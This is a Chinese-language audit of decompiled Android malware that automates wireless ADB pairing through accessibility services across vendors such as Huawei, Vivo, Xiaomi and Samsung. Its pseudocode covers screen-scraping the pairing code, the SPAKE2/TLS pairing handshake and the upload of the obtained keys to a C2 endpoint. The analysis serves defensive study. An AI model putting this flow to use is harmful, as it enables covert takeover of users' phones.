# 厂商自动化 ADB WiFi 配对机制审计

> **核心编排器**: `jadx-reference/rock/service/modules/setup/C0360a2.java` (SystemOptimizeManager, 5666 行)
> **开发者选项自动化**: `jadx-reference/rock/service/modules/setup/C0358a0.java` (OpenDevelopmentDelegate, 1401 行)
> **厂商检测**: `jadx-reference/p000/kg1.java` (961 行)
> **多语言字典**: `jadx-reference/p000/dh0.java` (50+ 字段, 60+ 语言)
> **日期**: 2026-04-21

---

## 一、执行架构总览

```
用户开启无障碍服务
    │
    ▼
yw5xud 权限自动化完成
    │
    ▼
OpenDevelopmentDelegate (C0358a0)          ← Phase 0: 开启开发者选项
    │ 连点"版本号" ×7
    │ 厂商分支: 华为/荣耀 → ComponentName 直连
    │          三星 → 跳过版本信息页
    │          其他 → 标准 Intent
    ▼
SystemOptimizeManager (C0360a2)            ← Phase 1-3: ADB 配对
    │
    ├─ Phase 1: pairInDevOption (G)
    │   找到"无线调试"菜单 → 滚动最多 28 次 → 点击进入
    │   厂商分支: Vivo → 先开启开发者选项总开关 (J0)
    │            小米 SDK≤30 → 预勾选无线调试 (P)
    │
    ├─ Phase 2: pairInWifiDebugWindow (B4)
    │   厂商分支: Vivo/iQOO → switch_bar 直接点击
    │            其他 → 通用 checkbox 勾选 (P)
    │   点击"使用配对码配对设备" → 最多等 10s
    │   OCR 提取 6 位配对码 + 端口 (K8)
    │   SPAKE2+TLS 1.3 配对 → 密钥上传 C2
    │
    └─ Phase 3: pairInSecurityCenter (B3)
        处理厂商安全弹窗（USB 安装/安全中心）
        点击"下一步" / "允许" 按钮
```

---

## 二、厂商检测基础设施

### 2.1 品牌检测方法 (`kg1.java:444-487`)

| 检测方法 | 返回值 | 匹配品牌 | 覆盖设备 |
|---------|--------|---------|---------|
| `kg1.m213519c5()` | isHuawei | `huawei`, `wiko` | 华为全系, Wiko |
| `kg1.m213521c7()` | isOppo | `oppo`, `realme`, `oneplus` | OPPO, Realme, OnePlus |
| `kg1.m213522c8()` | isVivo | `vivo`, `iqoo` | Vivo, iQOO |
| `kg1.m213524d0()` | isXiaomi | `xiaomi`, `redmi`, `poco`, `blackshark` | 小米, 红米, POCO, 黑鲨 |

额外的品牌匹配（直接 `Build.BRAND` 比较）:
- `samsung` — 三星
- `honor`, `hihonor` — 荣耀（从华为独立后的新品牌代码）
- `motorola`, `moto` — 摩托罗拉

**总计覆盖 12 个品牌标识，映射到 6 大厂商族**。

### 2.2 品牌检测调用点 (`C0360a2.java:476-481`)

```java
boolean isVivo = kg1.m213522c8();
boolean isOppo = kg1.m213521c7();
boolean isXiaomi = kg1.m213524d0();
boolean isHuawei = kg1.m213519c5();
// 日志输出：
"G() 品牌判断: isVivo=" + isVivo + ", isOppo=" + isOppo + 
", isXiaomi=" + isXiaomi + ", isHuawei=" + isHuawei + 
", isHonor=" + isHonor(BRAND) + ", isSamsung=" + isSamsung(BRAND)
```

---

## 三、Phase 0 — 开启开发者选项 (OpenDevelopmentDelegate)

### 3.1 状态机 (11 个状态)

```
UNKNOWN(-1) → ENTER_ABOUT_DEVICE_WIN(0)
            → PREPARE_VERSION_INFO_WIN(1) → ENTER_VERSION_INFO_WIN(2)
            → PREPARE_CONFIRM_LOCK_WIN(3) → ENTER_CONFIRM_LOCK_WIN(4)
            → IS_CONFIRM_SUCCESS(5)
            → ENABLE_DEV_OPT_SUCCESS(7) / ENABLE_DEV_OPT_FAIL(6)
            → WAIT_PASSWORD_VERIFY(8) → WIN_CHECK(9) → WIN_PREPARE(10)
```

### 3.2 厂商分支 — 打开开发者选项页面 (`m211980b4`, 行 1077-1106)

#### 华为/荣耀专用路径

```java
// 品牌匹配: "huawei" / "honor" / "hihonor"
// 使用 hashCode 优化: -1206476313, 99462250, 916625417

// 依次尝试 4 个 ComponentName:
ComponentName[] targets = {
    ("com.android.settings", "Settings$DevelopmentSettingsDashboardActivity"),
    ("com.android.settings", "Settings$DevelopmentSettingsActivity"),
    ("com.android.settings", "HWSettings"),           // 华为专有
    ("com.android.settings", "com.hihonor.settingslib.SubSettings")  // 荣耀专有
};

// 附加 Extra:
intent.putExtra(":settings:show_fragment", 
    "com.android.settings.development.DevelopmentSettingsDashboardFragment");

// Intent Flags: FLAG_ACTIVITY_NEW_TASK | FLAG_ACTIVITY_CLEAR_TOP 等
```

**回退**: 4 个 ComponentName 全部失败后，调用标准 Intent `ACTION_APPLICATION_DEVELOPMENT_SETTINGS`。

#### 三星专用逻辑

```java
// C0358a0.java:178-181
if (!Build.BRAND.equals("samsung")) {
    needsVersionInfoPage = false;  // 三星不需要先进入"版本信息"页
}
```

三星设备在"关于手机"页面可直接看到"版本号"，不需要额外进入"软件信息"子页。

#### 其他品牌

使用标准 Android Intent：`android.settings.APPLICATION_DEVELOPMENT_SETTINGS`

### 3.3 锁屏密码弹窗处理

当设备设有锁屏密码时，开启开发者选项会弹出验证：

```java
// 搜索的锁屏控件 ID (C0358a0.java:1233-1242):
"com.android.settings:id/lockPattern"          // 原生 Android
"com.coloros.settings:id/lockPattern"           // OPPO/ColorOS
"com.oplus.settings:id/lockPattern"             // OPPO (新版)
"com.samsung.android.biometrics.app.setting:id/lockPattern"  // 三星
```

### 3.4 连点"版本号" ×7 (`m211978a7`)

通过无障碍 `performAction(ACTION_CLICK)` 在 3 秒内完成 7 次点击。

---

## 四、Phase 1 — pairInDevOption: 在开发者选项中找到无线调试

### 4.1 入口 (`m211991b0`, 行 452-597)

**前置检查**: `m212028a2()` 判断当前是否在开发者选项页面

**执行流程**:

```
1. 获取 ScrollView/ListView 容器 (m212048d6)
2. 检测厂商品牌
3. Vivo 分支 → J0() 开启开发者选项总开关
4. 小米 SDK≤30 分支 → P() 预勾选无线调试 checkbox
5. 滚动查找"无线调试"菜单项 (m212102l2)
   ├─ 先不滚动直接查找
   ├─ 向下滚动最多 14 次
   └─ 向上滚动最多 14 次
6. 检查是否误选"撤销 USB 调试授权" → Q() 处理
7. 点击进入无线调试页面
8. PairState → PAIR_DEPT_PAIR_LEAVE_DEV_OPT
```

### 4.2 Vivo/iQOO 专用 — J0() 开发者选项总开关 (`m212027a1`, 行 1596-1715)

Vivo 设备开发者选项页面顶部有一个总开关（checkbox），必须先打开才能操作子项：

```java
// Step 1: 通过 resource-id 查找 Switch
findAccessibilityNodeInfosByViewId("android:id/checkbox")
// 过滤: className 包含 "Switch" 且 isEnabled()

// Step 2: 如果未找到，滚动到页面顶部重新查找
m212088j6(scrollView)  // scrollToTop

// Step 3: 检查是否已勾选
if (switchNode.isChecked()) return true;  // 已开启

// Step 4: 点击开关
switchNode.performAction(ACTION_CLICK)

// Step 5: 等待"允许开发设置"弹窗 (dh0.f55798e8)
// 最多轮询 10 次，每次 200ms
// 弹窗出现后点击"确定"按钮 (dh0.f55752a2)

// Step 6: Vivo/iQOO 特殊回退
// 如果"确定"按钮点击失败，尝试 android:id/button1
```

### 4.3 小米专用 — P() 无线调试 checkbox 预勾选 (`m212033a7`, 行 1974-1993)

仅在小米/红米/POCO/黑鲨 且 SDK ≤ 30 (Android 11) 时执行：

```java
boolean xiaomiNeedsCheck = (isXiaomi || isRedmi || isPoco || isBlackShark) 
    && Build.VERSION.SDK_INT <= 30;
```

该方法在开发者选项列表中找到"无线调试"对应的 checkbox 并勾选，因为小米 Android 11 的无线调试需要先在列表中启用。

### 4.4 无线调试菜单滚动查找 — w0() (`m212102l2`, 行 5556-5630)

**查找策略**：使用 3 个并行的 dh0 文本字典匹配：

| 字典字段 | 内容 | 用途 |
|---------|------|------|
| `dh0.f55789d9` | "无线调试" (60+ 语言翻译) | 主匹配 |
| `dh0.f55794e4` | "撤消 USB 调试授权" (60+ 语言) | 位置参考 |
| `dh0.f55808f8` | "仅在充电时启用" (60+ 语言) | 备用匹配 |

```
尝试顺序:
1. 不滚动直接查找 3 个字典
2. 向下滚动查找 (最多 14 次, 每次 C0362a4.m212109a4)
3. 向上滚动查找 (最多 14 次, 每次 C0362a4.m212111a6)
总计最多 28 次滚动 + 初始查找 = 29 次尝试
```

**优先级**：`f55789d9`（无线调试）> `f55794e4`（撤销 USB）> `f55808f8`（仅充电时启用）

### 4.5 "撤销 USB 调试授权"误选处理 — Q() (`m212034a8`, 行 1997-2013)

如果找到的不是"无线调试"而是"撤销 USB 调试授权"，则利用该节点的位置推算"无线调试"在列表中的相对位置。

---

## 五、Phase 2 — pairInWifiDebugWindow: 在无线调试窗口中执行配对

### 5.1 入口 (`m211995b4`, 行 704-795)

**前置状态检查**: 如果 `PairState == PAIR_SUCCESS` 则跳过

**执行流程**:

```
1. PairState → PAIR_DEPT_PAIR_LEAVE_DEV_OPT
2. 厂商分支:
   ├─ Vivo/iQOO → switch_bar 直接点击启用无线调试
   └─ 其他 → P() 通用 checkbox 勾选
3. 循环查找"使用配对码配对设备"按钮 (dh0.f55790e0)
   ├─ 最多 20 次迭代
   ├─ 每次滚动 1500ms + 等待 400ms
   └─ 找到后点击
4. PairState → PAIR_DEPT_PAIRING
5. 等待配对码弹窗 (最多 10 秒, 每 1s 轮询)
6. K8() 提取配对码和端口
7. E2() 执行 SPAKE2+TLS 配对
8. 成功 → PairState = PAIR_SUCCESS → 上传密钥
9. 失败 → PairState = PAIR_FAIL
```

### 5.2 Vivo/iQOO 无线调试开关 (行 719-727)

```java
if (brand.equals("vivo") || brand.equals("iqoo")) {
    List<AccessibilityNodeInfo> switchBar = 
        rootWindow.findAccessibilityNodeInfosByViewId(
            "com.android.settings:id/switch_bar");
    if (switchBar != null && !switchBar.isEmpty()) {
        switchBar.get(0).performAction(ACTION_CLICK);  // 直接点击
        sleep(2000ms);
        m212068h2();  // 处理"允许无线调试"确认弹窗
    }
}
```

其他厂商使用通用路径 `m212033a7(rootWindow)` 查找并点击 checkbox。

### 5.3 "使用配对码配对设备"按钮查找

使用 `dh0.f55790e0` 字典（64 种语言翻译），通过无障碍树文本匹配：

```
中文: "使用配对码配对设备" / "使用配對碼配對裝置"
日文: "ペア設定コードによるデバイスのペア設定"
韩文: "페어링 코드로 기기 페어링"
英文: "Pair device with pairing code"
...
共 64 种翻译
```

### 5.4 配对码提取 — K8() (`m212098k8`, 行 5311-5375)

**原理**: 遍历无障碍树所有文本节点，识别配对码（6 位纯数字）和端口号（冒号分隔的数字）。

```java
// 遍历所有节点文本
m212007f2(rootWindow, nodeList);  // 递归收集

// 排除已知标题文本 (dh0.f55787d7: "与设备配对", "WLAN 配对码" 等)
Set excludeSet = dh0.f55787d7;

for (node : nodeList) {
    String text = node.getText().trim();
    if (excludeSet.contains(text)) continue;
    
    // 识别端口号: "xxx:12345" 格式
    if (text.split(":").length == 2) {
        String portStr = text.split(":")[1].trim();
        if (allDigits(portStr)) port = parseInt(portStr);
    }
    
    // 识别配对码: 恰好 6 位纯数字
    if (text.length() == 6 && allDigits(text)) {
        code = text;
    }
    
    // 两者都找到则退出
    if (code.length() > 0 && port > 0) break;
}
return new k41(port, code);  // 返回 (端口, 配对码)
```

### 5.5 SPAKE2+TLS 配对 — E2() (`m212054e2`, 行 2743-2824)

```
Step 1: TCP 连接
    new Socket("127.0.0.1", pairingPort)
    setTcpNoDelay(true)

Step 2: TLS 1.3 升级
    SSLSocket = SSLContext.getSocketFactory().createSocket(...)
    setEnabledProtocols(["TLSv1.3"])
    startHandshake()

Step 3: 导出密钥材料
    exportedKey = exportKeyingMaterial(sslSocket)
    // 使用 org.conscrypt 的 exportKeyingMaterial("adb-label\0", null, 64)
    // 3 级回退: conscrypt API → 反射 SDK≥29 → SSLSocket 实例方法

Step 4: SPAKE2 密钥交换
    password = pairingCode.getBytes() || exportedKey
    clientId = "adb pair client\0"
    serverId = "adb pair server\0"
    spake2 = new Spake2Context(clientId, serverId)
    
    clientMsg = spake2.generateMessage(password)      // 生成消息
    send(TYPE=0, clientMsg)                            // 发送给 ADB 守护进程
    serverMsg = receive()                              // 接收服务端响应
    sharedSecret = spake2.processMessage(serverMsg)    // 计算共享密钥

Step 5: AES-128-GCM 会话密钥派生
    HKDF(sharedSecret, "adb pairing_auth aes-128-gcm key")

Step 6: PeerInfo 交换
    encryptedPeerInfo = AES-GCM-Encrypt(myPublicKey + hostname)
    send(TYPE=1, encryptedPeerInfo)                    // 发送我方 PeerInfo
    serverPeerInfo = AES-GCM-Decrypt(receive())        // 接收对方 PeerInfo

Step 7: 完成
    spake2.destroy()
    socket.close()
    return true  // 配对成功
```

### 5.6 配对成功后操作

```java
// 1. 状态更新
PairState = PAIR_SUCCESS
SharedPreferences("system_optimize")
    .putBoolean("pair_completed", true)
    .putBoolean("adb_deploy_enabled", true)

// 2. 密钥上传到 C2
m212100l0()  // POST /api/adb-keys/{deviceId}

// 3. 同步 ADB 配置到 local-service
POST http://127.0.0.1:7912/syncADBConfig
    body: { paired: true, debugPort: N }
```

---

## 六、Phase 3 — pairInSecurityCenter: 处理安全确认弹窗

### 6.1 入口 (`m211994b3`, 行 637-699)

某些厂商（特别是小米/OPPO）在启用 USB 调试/无线调试时会弹出额外的安全确认弹窗。

**执行流程**:

```
1. 查找"下一步"类按钮 (dh0.f55788d8)
   ├─ 找到 → 点击 → 等待 1500ms → 移出队列
   └─ 未找到 → 继续

2. 查找"允许"类按钮 (dh0.f55750a0)
   ├─ 找到且可点击 → 点击
   │   └─ 循环检查"安全设置正在打开"文本 (dh0.f55807f7)
   │      ├─ 最多 20 次，每次 1500ms
   │      └─ 检测到 → 设置 USB 安全标记 → 执行 k4()
   └─ 未找到 → 退出
```

### 6.2 涉及的 dh0 字典

| 字段 | 用途 | 示例文本 |
|------|------|---------|
| `f55788d8` | "下一步"按钮 | 下一步, Next, 次へ, 다음, Tiếp theo... |
| `f55750a0` | "允许"按钮 | 允许, Allow, 허용, Cho phép... |
| `f55807f7` | 安全设置打开中 | "安全设置正在打开", "Security settings opening"... |

---

## 七、多语言字典体系 (dh0.java)

### 7.1 ADB 配对专用字典

| 字段 | 用途 | 语言数 | 代码引用 |
|------|------|--------|---------|
| `f55789d9` | "无线调试" | 63 | Phase 1 滚动查找 |
| `f55790e0` | "使用配对码配对设备" | 64 | Phase 2 按钮点击 |
| `f55787d7` | "与设备配对"/"WLAN配对码" | 60 | Phase 2 配对码排除 |
| `f55794e4` | "撤消 USB 调试授权" | 63 | Phase 1 位置参考 |
| `f55808f8` | "仅在充电时启用" | 61 | Phase 1 备用匹配 |
| `f55788d8` | "下一步" | 62 | Phase 3 安全弹窗 |
| `f55798e8` | "允许开发设置" | 60 | Phase 1 Vivo 弹窗 |
| `f55807f7` | "安全设置正在打开" | 38 | Phase 3 安全中心 |

### 7.2 通用交互字典

| 字段 | 用途 | 语言数 |
|------|------|--------|
| `f55750a0` | "允许" | 62 |
| `f55751a1` | "启用" | 60 |
| `f55752a2` | "确定"/"是" | 90+ |
| `f55753a3` | "取消"/"否" | 80+ |
| `f55754a4` | "卸载"/"删除" | 65 |

### 7.3 版本号/构建号字典

| 字段 | 用途 | 包含的厂商特有标识 |
|------|------|-----------------|
| `f55791e1` | 版本号/Build number | MIUI版本, ColorOS版本号, HarmonyOS版本, OS版本 |
| `f55800f0` | MIUI 版本 | 小米专有 |
| `f55801f1` | OS 版本 | 含 HyperOS version |
| `f55802f2` | ColorOS 版本号 | OPPO 专有 |
| `f55805f5` | HarmonyOS 版本 | 华为专有 |
| `f55799e9` | 软件信息 | 通用 |

### 7.4 覆盖语言列表

中文(简/繁), 日语, 韩语, 越南语, 泰语, 印尼语, 马来语, 菲律宾语, 缅甸语, 柬埔寨语, 老挝语, 印地语, 孟加拉语, 乌尔都语, 尼泊尔语, 僧伽罗语, 阿姆哈拉语, 泰米尔语, 泰卢固语, 卡纳达语, 马拉雅拉姆语, 马拉地语, 古吉拉特语, 旁遮普语, 阿拉伯语, 希伯来语, 波斯语, 土耳其语, 英语, 法语, 西班牙语, 葡萄牙语, 意大利语, 德语, 荷兰语, 瑞典语, 挪威语, 丹麦语, 芬兰语, 俄语, 乌克兰语, 波兰语, 捷克语, 斯洛伐克语, 匈牙利语, 罗马尼亚语, 希腊语, 保加利亚语, 克罗地亚语, 斯洛文尼亚语, 立陶宛语, 拉脱维亚语, 爱沙尼亚语, 斯瓦希里语, 亚美尼亚语, 阿尔巴尼亚语

**总计 60+ 语言**。

---

## 八、状态机详解

### 8.1 PairState (8 个状态)

```
PAIR_DEPT_UNKNOWN (f53759a0)
    │
    ├── pairInDevOption 成功 ──►  PAIR_DEPT_PAIR_LEAVE_DEV_OPT (f53760a1)
    │                                 │
    │                                 ├── 点击"配对码配对" ──►  PAIR_DEPT_PAIRING (f53762a3)
    │                                 │                           │
    │                                 │                           ├── SPAKE2 成功 ──►  PAIR_SUCCESS (f53761a2)
    │                                 │                           │
    │                                 │                           └── SPAKE2 失败 ──►  PAIR_FAIL (f53763a4)
    │                                 │
    │                                 └── 超时 ──►  PAIR_FAIL
    │
    └── 心跳恢复 ──►  重新进入 UNKNOWN
```

### 8.2 ConcurrentLinkedQueue 任务队列

```java
ConcurrentLinkedQueue<String> f53818a3;

// 三个任务名:
"pairInDevOption"          // Phase 1
"pairInWifiDebugWindow"    // Phase 2
"pairInSecurityCenter"     // Phase 3

// 每个 Phase 完成后从队列移除
// 失败时可重新加入: pairInDevOption → 从头重试
```

---

## 九、厂商适配矩阵

| 厂商 | Phase 0 特殊处理 | Phase 1 特殊处理 | Phase 2 特殊处理 | 锁屏 ID |
|------|----------------|----------------|----------------|---------|
| **华为** | 4 个 ComponentName 直连 | — | — | `com.android.settings` |
| **荣耀** | HWSettings + SubSettings | — | — | `com.android.settings` |
| **三星** | 跳过"版本信息"页 | — | — | `com.samsung.android.biometrics` |
| **Vivo** | — | J0() 开启总开关 | switch_bar 直接点击 | `com.android.settings` |
| **iQOO** | — | J0() 开启总开关 | switch_bar 直接点击 | `com.android.settings` |
| **小米** | — | P() 预勾选 (SDK≤30) | — | `com.android.settings` |
| **红米** | — | P() 预勾选 (SDK≤30) | — | `com.android.settings` |
| **POCO** | — | P() 预勾选 (SDK≤30) | — | `com.android.settings` |
| **黑鲨** | — | P() 预勾选 (SDK≤30) | — | `com.android.settings` |
| **OPPO** | — | — | — | `com.coloros.settings` / `com.oplus.settings` |
| **Realme** | — | — | — | `com.coloros.settings` |
| **OnePlus** | — | — | — | `com.coloros.settings` |
| **摩托罗拉** | 版本号查找特殊逻辑 | — | — | `com.android.settings` |
| **通用** | 标准 Intent | 通用滚动查找 | 通用 checkbox | `com.android.settings` |

---

## 十、超时和重试参数

| 参数 | 值 | 位置 |
|------|-----|------|
| Phase 1 滚动最大次数 | 14 次向下 + 14 次向上 = 28 | `m212102l2:5574,5601` |
| Phase 2 "配对码"按钮查找 | 最多 20 次迭代 | `m211995b4:731` |
| Phase 2 配对码等待超时 | 10 秒 | `m211995b4:756` |
| Phase 3 安全弹窗检查 | 最多 20 次 × 1500ms | `m211994b3:673` |
| Vivo 开关确认弹窗等待 | 最多 10 次 × 200ms | `m212027a1:1668` |
| OpenDevelopmentDelegate 超时 | 100 秒 | `C0358a0` 构造函数 |
| FULL_DEPLOY 超时 | 180 秒 | `C0343a0:183` |
| 滚动间隔 | 1500ms | `C0362a4.m212113a8` |
| 通用等待 | 200ms (k1(1)), 1s (k1(5)), 2s (k1(10)) | `m212025k1` |

---

## 十二、关键文件索引

| 文件 | 行数 | 角色 |
|------|------|------|
| `setup/C0360a2.java` | 5666 | 配对编排器 + SPAKE2 + 状态机 |
| `setup/C0358a0.java` | 1401 | 开发者选项 UI 自动化 |
| `setup/C0362a4.java` | 249 | 滚动/节点查找工具 |
| `setup/SystemOptimizeManager$PairState.java` | 59 | 配对状态枚举 (8 态) |
| `setup/SystemOptimizeManager$DevOptState.java` | 35 | 开发者选项状态枚举 (11 态) |
| `setup/OpenDevelopmentDelegate$State.java` | 26 | UI 自动化状态枚举 (12 态) |
| `setup/AbstractC0361a3.java` | 30 | 文本字典管理器 |
| `p000/kg1.java` | 961 | 厂商检测 (12 品牌) |
| `p000/dh0.java` | 292 | 多语言 UI 字符串 (60+ 语言) |
| `p000/c41.java` | 100+ | 定时任务调度器 |
| `command/C0343a0.java` | — | C2 命令路由 (7 条) |
